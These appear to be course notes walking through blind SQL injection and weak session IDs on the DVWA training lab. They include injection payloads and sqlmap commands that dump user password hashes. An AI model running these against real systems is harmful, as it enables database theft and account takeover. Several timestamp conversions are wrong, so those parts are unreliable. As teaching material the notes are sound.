## Module 49: Blind SQL Injection (Detailed)

### Understanding Blind SQLi

**Recall:** In error-based SQLi, we got direct error messages and data output. In blind SQLi, we don't get direct feedback - we must infer information from the application's behavior.

**Key Difference:**

```
Error-Based: Database returns errors and data directly
Blind: No errors shown, must infer from behavior
```

**The Chef Analogy (Continued):**

**Before (Error-Based):**

```
You: "Show me all recipes"
Chef: "Here they are!" [Direct answer]
```

**Now (Blind SQLi):**

```
Chef has learned: Can't trust all requests
Chef now responds: Yes or No only

You: "Is this dish from Italy?"
Chef: *Nods* [Yes]

You: "Does it contain tomatoes?"
Chef: *Shakes head* [No]

You: "Does microwave brand start with H?"
Chef: "Yes"

You: "Does second letter start with A?"
Chef: "No"

Continue asking → Eventually reconstruct full information
```

**Extracting Names Character by Character:**

```
You: "Does microwave brand start with 'S'?"
Chef: "Yes"

You: "Is second letter 'A'?"
Chef: "Yes"

You: "Is third letter 'M'?"
Chef: "Yes"

Continue → Build: SAMSUNG
```

---

## Module 50: Blind SQLi Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → SQL Injection (Blind)
Security Level: Low
```

### Testing Normal Behavior

**Input: 1**

```
Result: User ID exists in the database
```

**Input: 100**

```
Result: User ID is MISSING from the database
```

**Analysis:** Binary response - Exists or Missing (Yes/No answer)

**Input: 2**

```
Result: User ID exists in the database
```

**Input: 200**

```
Result: User ID is MISSING from the database
```

**Key Observation:** No detailed error messages - classic blind SQLi behavior!

### Testing for Vulnerability

**Attempt 1: Break Query**

```
Input: 1'
Result: User ID is MISSING from the database
```

**No error shown!** But behavior changed

**Attempt 2: Always-True Condition**

```
Input: 1' OR '1'='1
Result: User ID exists in the database
```

**Analysis:**

- Query executes (exists message)
- But no data dump
- Confirms blind SQLi vulnerability!

### Time-Based Blind SQLi Detection

**Why Time-Based?**

- Application doesn't show errors
- Need another way to confirm execution
- Use time delays as confirmation

**Payload 1: With AND (Wrong)**

```sql
1' AND SLEEP(5) --
```

**Result:** Missing (query fails, no delay)

**Why Failed:**

```sql
WHERE user_id = '1' AND SLEEP(5)
↑ First part must be true for SLEEP to execute
```

**Payload 2: With OR (Correct)**

```sql
1' OR SLEEP(5) --
```

**Result:**

- Application hangs for 5 seconds
- Then shows: "User ID exists"
- **Confirmation: Blind SQLi vulnerable!** ✓

**How It Works:**

```sql
SELECT * FROM users WHERE user_id = '1' OR SLEEP(5) --

Logic:
- OR operator: If either side is true, return results
- SLEEP(5) executes AND returns true after 5 seconds
- Application delays = Confirmation of execution
```

### Enumeration Process

**Step 1: Count Columns**

```sql
1' ORDER BY 1 --
Result: User ID exists ✓

1' ORDER BY 2 --
Result: User ID exists ✓

1' ORDER BY 3 --
Result: User ID is MISSING ✗
```

**Conclusion:** Table has 2 columns

**Step 2: Attempt UNION (Won't Show Data)**

```sql
1' UNION SELECT user, password FROM users --
```

**Result:** Shows "exists" but no actual data displayed

**Problem:** Blind SQLi doesn't output data directly!

### Boolean-Based Data Extraction

**Technique:** Extract data by asking yes/no questions

**Test Database Length:**

**Payload:**

```sql
1' AND LENGTH(database()) = 1 --
```

**Result:** MISSING (False)

**Payload:**

```sql
1' AND LENGTH(database()) = 2 --
```

**Result:** MISSING (False)

**Payload:**

```sql
1' AND LENGTH(database()) = 3 --
```

**Result:** EXISTS (True)

**Conclusion:** Database name is 3 characters long

**Manual Extraction is Tedious:**

- Each character requires multiple tests
- Each test needs separate request
- Very time-consuming manually

---

## Module 51: SQLMap - Automated SQLi Exploitation

### What is SQLMap?

**Description:** Powerful automated SQL injection tool

**Features:**

- Automatic SQLi detection
- Database enumeration
- Data extraction
- Shell access capability
- Supports multiple DBMS
- Handles all SQLi types

**Pre-installed on Kali Linux:**

```bash
sqlmap --version
```

### Method 1: Using Burp Suite Request

**Step 1: Capture Request**

```bash
# Enable Burp proxy
FoxyProxy → Burp (Enabled)
Burp Suite → Intercept: ON
```

**Step 2: Submit Test Request**

```
Input: 1
Submit
```

**Step 3: Copy/Save Request**

**Intercepted Request:**

```http
GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc123; security=low
User-Agent: Mozilla/5.0...
```

**Save Request:**

```
Right-click → Save item → request.txt
```

**Step 4: Disable Intercept**

```
Intercept: OFF
FoxyProxy: Disabled
```

### Running SQLMap with Saved Request

**Basic Command:**

```bash
sqlmap -r request.txt
```

**Process:**

```
Testing connection to target URL
Parsing HTTP request from 'request.txt'
Testing parameter 'id'
```

**Questions During Scan:**

**Q1:** "Back-end DBMS is MySQL. Do you want to skip test payloads specific for other DBMSes?"

```
Answer: Y (Yes)
```

**Q2:** "Do you want to include all tests for 'MySQL'?"

```
Answer: Y (Yes)
```

**Q3:** "Parameter appears to be vulnerable. Do you want to keep testing?"

```
Answer: N (No - already confirmed)
```

**Detection Results:**

```
GET parameter 'id' is vulnerable
Back-end DBMS: MySQL
```

### Enumerating Databases

**Command:**

```bash
sqlmap -r request.txt --dbs
```

**Result:**

```
Available databases:
[*] information_schema
[*] dvwa
```

### Enumerating Tables

**Command:**

```bash
sqlmap -r request.txt -D dvwa --tables
```

**Result:**

```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

### Enumerating Columns

**Command:**

```bash
sqlmap -r request.txt -D dvwa -T users --columns
```

**Result:**

```
Table: users
[8 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| user_id    | int(6)      |
| first_name | varchar(15) |
| last_name  | varchar(15) |
| user       | varchar(15) |
| password   | varchar(32) |
| avatar     | varchar(70) |
| last_login | timestamp   |
| failed_login| int(3)     |
+------------+-------------+
```

### Dumping Specific Columns

**Command:**

```bash
sqlmap -r request.txt -D dvwa -T users -C user,password --dump
```

**Result:**

```
Database: dvwa
Table: users
[5 entries]
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| admin  | 5f4dcc3b5aa765d61d8327deb882cf99|
| gordon | e99a18c428cb38d5f260853678922e03|
| 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b|
| pablo  | 0d107d09f5bbe40cade3de5c71e9e9b7|
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99|
+--------+----------------------------------+
```

**Success:** All usernames and password hashes dumped! 🎯

### Dumping All Data

**Command:**

```bash
sqlmap -r request.txt -D dvwa -T users --dump-all
```

**Result:** Dumps entire users table with all columns

---

## Module 52: SQLMap - Manual Method

### When to Use Manual Method

**Use Cases:**

- Burp Suite method doesn't work
- Need more control over parameters
- Testing specific injection points
- Application has complex requests

### Manual SQLMap Command Structure

**Change Security Level:**

```
DVWA Security → Medium
```

**Capture Request in Burp:**

```http
POST /vulnerabilities/sqli_blind/ HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc123; security=medium

id=1&Submit=Submit
```

### Building Manual Command

**Template:**

```bash
sqlmap -u "URL" --cookie="COOKIE" --data="DATA" -p PARAMETER --dbs
```

**Step 1: URL**

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli_blind/"
```

**Step 2: Add Cookie**

```bash
--cookie="PHPSESSID=abc123; security=medium"
```

**Step 3: Add POST Data**

```bash
--data="id=1&Submit=Submit"
```

**Step 4: Specify Parameter**

```bash
-p id
```

**Complete Command:**

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" \
  --cookie="PHPSESSID=abc123; security=medium" \
  --data="id=1&Submit=Submit" \
  -p id \
  --dbs
```

### Execution Process

**Running the Command:**

```bash
# Disable Burp intercept first
Intercept: OFF

# Execute
sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" \
  --cookie="PHPSESSID=abc123; security=medium" \
  --data="id=1&Submit=Submit" \
  -p id \
  --dbs
```

**Responses:**

**Detection:**

```
POST parameter 'id' appears to be vulnerable
Do you want to test this parameter? [Y/n] Y
```

**DBMS Identification:**

```
Back-end DBMS: MySQL
it looks like the back-end DBMS is 'MySQL'
Do you want to skip? [Y/n] Y
```

**Results:**

```
Available databases:
[*] information_schema
[*] dvwa
```

### Dumping Data Manually

**Dump All:**

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" \
  --cookie="PHPSESSID=abc123; security=medium" \
  --data="id=1&Submit=Submit" \
  -p id \
  -D dvwa \
  --dump-all
```

**Result:** Complete database dump with all tables and columns

---

## Module 53: Weak Session IDs

### What are Sessions?

**Definition:** When you log into a website (email, shopping site), the website needs to remember who you are as you click around. It does this by giving you a session ID - kind of like a visitor badge.

**Key Points:**

- Session ID stored in browser (usually in cookie)
- Long random string of letters and numbers
- Helps website remember your login
- Active as long as you're logged in
- Expires when you logout or after timeout

**Session Management:**

```
Login → Session Created → Session ID in Cookie → Stay Logged In
Logout → Session Destroyed → Must Login Again
Timeout → Session Expires → Must Login Again
```

**Real Example:**

```
You login to Gmail
Session ID: a8f3k2m9p1x7z4b6
Gmail remembers you using this ID
Can access inbox, send emails, etc.
Without session ID → Must login for every action
```

### What is a Weak Session ID?

**Definition:** A weak session ID is one that's too simple and predictable.

**Examples of Weak Session IDs:**

**1. Simple Numbers:**

```
Session 1: 1
Session 2: 2
Session 3: 3
Pattern: Incremental (Easy to guess!)
```

**2. Predictable Patterns:**

```
User ID + Time:
User 1234 at 10:00 → Session: 123410
User 5678 at 10:01 → Session: 567810
Pattern: UserID + Time (Predictable!)
```

**3. Short IDs:**

```
Session: abc123
Too short = Easy to brute force
```

**The Visitor Badge Analogy:**

```
Bad System: Badges numbered 1, 2, 3...
Attacker thinks: "I'll try badge 2, 3, 4..."
Eventually gets access!

Good System: Random complex badges
Badge: a8f3k2m9p1x7z4b6c5v8n4m1...
Impossible to guess
```

### Weak Session ID Attack

**How It Works:**

**Step 1:** Attacker discovers pattern

```
Your session: 1001
Next user: 1002
Pattern identified!
```

**Step 2:** Guess other session IDs

```
Try: 1002, 1003, 1004...
One will be active user's session
```

**Step 3:** Impersonate victim

```
Set cookie to victim's session ID
Browser thinks you're the victim
Access their account!
```

**No Password Needed!**

- ✓ Bypasses login
- ✓ Bypasses 2FA
- ✓ Complete account access
- ✓ Works while session active

### Real-World Session Theft (InfoStealer Malware)

**How Accounts Get Hacked:**

**Step 1:** Victim installs malware

```
Clicks suspicious link
Downloads "free software"
Malware installs silently
```

**Step 2:** InfoStealer activates

```
Scans browser for saved sessions
Copies session cookies:
- Google sessions
- Facebook sessions
- Instagram sessions
- Banking sessions
```

**Step 3:** Sends to attacker

```
All session cookies → Attacker's server
Attacker imports cookies
Instant access to all accounts!
```

**Impact:**

```
No password needed
No 2FA bypass required
All security bypassed
Complete account takeover
```

### Bug Bounty Context

**If You Find Weak Session IDs:**

**High Impact Vulnerability:**

- ✓ Account takeover possible
- ✓ Can impersonate any user
- ✓ Bypasses all authentication
- ✓ Critical severity

**Exploitation:**

- Predict session IDs
- Brute force sessions
- Impersonate users
- Access private data

---

## Module 54: Weak Session IDs Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → Weak Session IDs
Security Level: Low
```

**Interface:**

```
Message: "This page will set a new cookie called
         'dvwaSession' each time the button is clicked."

Button: [Generate]
```

### Testing Session Generation

**Step 1: Open Developer Tools**

```
Press F12
Navigate to: Storage → Cookies → localhost
```

**Step 2: Generate First Session**

```
Click: Generate
Result in Cookies:
  Name: dvwaSession
  Value: 1
```

**Step 3: Generate More Sessions**

```
Click: Generate
  dvwaSession: 2

Click: Generate
  dvwaSession: 3

Click: Generate
  dvwaSession: 4
```

**Pattern Identified:** Simple incremental numbers!

### Source Code Analysis

**View Source:**

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if ($lastSessionID != 0) {
        $lastSessionID++;  // Just increment!
        setcookie("dvwaSession", $lastSessionID);
    }
}
?>
```

**Vulnerability:**

```php
$lastSessionID++;  // Simply adds 1 each time
```

**Problem:**

- No randomization
- Predictable pattern
- Easy to guess next session
- Can impersonate any user

**Exploitation:**

```
Current session: 3
Next user's session: 4, 5, 6...
Attacker can guess all sessions!
```

---

## Module 55: Weak Session IDs - Medium Security

### Analyzing Medium Security

**Change Security Level:**

```
DVWA Security → Medium
Navigate to: Weak Session IDs
```

### Testing Generation

**Generate Session:**

```
Click: Generate
Result: 1736504441
```

**Generate Again:**

```
Click: Generate
Result: 1736504642
```

**Generate Again:**

```
Click: Generate
Result: 1736504629
```

**Pattern:** Random-looking numbers!

### Decoding the Pattern

**Tool: CyberChef (cyber chef.org)**

**Step 1: Copy Session Value**

```
Value: 1736504642
```

**Step 2: Decode in CyberChef**

```
Recipe: From Hex Timestamp
or
Recipe: From Unix Timestamp

Input: 1736504642
Output: Thursday, 10 July 2025, 11:20 UTC
```

**Discovery:** Session IDs are Unix timestamps!

### Why This is Still Weak

**Timestamp-Based Sessions:**

```
Session generated at: 11:20:00 → 1736504400
Session generated at: 11:20:01 → 1736504401
Session generated at: 11:20:02 → 1736504402
```

**Exploitation:**

```
1. Know approximate time user logged in
2. Calculate Unix timestamp for that time
3. Try timestamps around that range
4. Eventually hit correct session ID
```

**Proof: Generate Different Timestamps**

**In CyberChef:**

```
Input: 11 July 2025, 11:20 UTC
Recipe: To Unix Timestamp
Output: 1736590800

Change time slightly:
11 July 2025, 11:21 UTC → Different timestamp
```

**Still Predictable!**

- ✓ Based on time
- ✓ Can calculate range
- ✓ Brute force possible
- ✓ Not truly random

### Secure Session ID Requirements

**For Developers:**

**Bad Examples:**

```
❌ Sequential: 1, 2, 3, 4...
❌ Timestamp-based: 1736504642
❌ User ID + Time: 12341736504642
❌ Short random: abc123
```

**Good Example:**

```
✓ Long random string
✓ Cryptographically secure random
✓ Unpredictable
✓ Example: a8f3k2m9p1x7z4b6c5v8n4m1q7w2e9r5t3y8
```

**Proper Implementation:**

```php
// Good: Cryptographically secure random
session_start();
$_SESSION['id'] = bin2hex(random_bytes(32));

// Bad: Predictable
$_SESSION['id'] = time();
$_SESSION['id'] = $user_id . time();
```

---
